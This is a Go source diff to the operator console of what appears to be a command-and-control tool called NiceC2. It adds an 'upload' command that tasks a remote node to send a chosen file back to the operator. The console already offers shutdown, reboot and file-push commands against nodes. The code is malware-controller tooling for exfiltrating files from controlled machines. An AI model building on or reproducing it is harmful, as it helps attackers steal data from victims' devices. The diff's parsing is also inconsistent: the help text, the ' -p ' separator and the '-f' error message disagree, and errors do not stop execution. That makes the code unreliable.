@@ -66,7 +66,8 @@ func main() {
 			fmt.Println("shutdown <node>\t\t\t\t\t\t- Shutdown device")
 			fmt.Println("reboot <node>\t\t\t\t\t\t- Reboot device")
 			fmt.Println("Exit\t\t\t\t\t\t\t- Exit the NiceC2 interface")
-			fmt.Println("Download <node> -f <file> -d <destination path>\t\t- Upload file to the client.")
+			fmt.Println("Download <node> -f <file> -d <destination path>\t\t- Download file to the client.")
+			fmt.Println("Upload <node> <filepath>\t\t- Upload file from the client.")
 
 		}
 		if strings.Compare("exit", text) == 0 {
@@ -123,8 +124,40 @@ func main() {
 
 		}
 
+		if strings.HasPrefix(text, "upload") {
+
+			text := text[7:]
+
+			node, path, err := parse_upload(text)
+			if err != nil {
+				fmt.Println("Error parsing input")
+			}
+
+			upload(node, path)
+			// upload(text)
+
+		}
+
 	}
 
+}
+
+func parse_upload(input string) (string, string, error) {
+	// Split by -f first
+	parts := strings.Split(input, " -p ")
+	if len(parts) != 2 {
+		return "", "", errors.New("Invalid input: -f needs to come first")
+	}
+
+	return parts[0], parts[1], nil
+}
+
+func upload(node string, path string) {
+
+	task_id := create_task_by_ID(node, "upload", path, "2")
+	fmt.Println("Upload Task created (" + task_id + ")")
+	time.Sleep(5 * time.Second) // Time is added to wait for command to get to / be run on node
+	get_task_by_id(task_id)
 }
 
 func parse_download(input string) (string, string, string, error) {
